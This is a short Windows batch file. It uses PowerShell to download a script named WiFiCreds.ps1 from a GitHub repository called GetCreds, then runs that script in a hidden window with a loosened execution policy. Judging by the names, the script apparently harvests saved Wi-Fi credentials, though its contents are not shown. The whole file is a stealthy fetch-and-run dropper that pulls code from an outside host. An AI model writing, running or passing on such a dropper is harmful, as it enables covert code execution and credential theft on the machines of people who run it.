@echo off

powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Zmk55/GetCreds/main/WiFiCreds.ps1 -Outfil .\WifiCreds.ps1"

powershell -WindowStyle hidden  -executionpolicy remotesigned -File .\WifiCreds.ps1
